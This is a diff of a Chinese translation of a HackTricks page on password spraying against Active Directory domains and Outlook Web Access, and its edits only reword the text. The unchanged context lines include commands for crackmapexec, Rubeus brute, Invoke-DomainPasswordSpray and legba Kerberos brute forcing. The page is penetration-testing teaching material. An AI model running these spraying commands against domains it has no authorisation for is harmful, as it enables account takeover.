@@ -2,6 +2,7 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
+
 ## **密码喷洒**
 
 一旦你找到了几个 **有效的用户名**，你可以尝试最 **常见的密码**（请记住环境的密码策略）与每个发现的用户。\
@@ -13,7 +14,7 @@
 
 ### 获取密码策略
 
-如果你有一些用户凭据或作为域用户的 shell，你可以 **通过以下方式获取密码策略**：
+如果你有一些用户凭据或作为域用户的 shell，你可以 **获取密码策略**：
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -76,7 +77,7 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-- 使用 [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)（它可以默认从域生成用户，并将从域获取密码策略，并根据该策略限制尝试次数）：
+- 使用 [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)（它可以默认从域中生成用户，并将从域中获取密码策略，并根据该策略限制尝试次数）：
 ```powershell
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
@@ -90,7 +91,7 @@ legba kerberos --target 127.0.0.1 --username admin --password wordlists/password
 ```
 ## Outlook Web Access
 
-有多种工具用于**密码喷洒 Outlook**。
+有多种工具可以进行**密码喷洒 Outlook**。
 
 - 使用 [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
 - 使用 [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
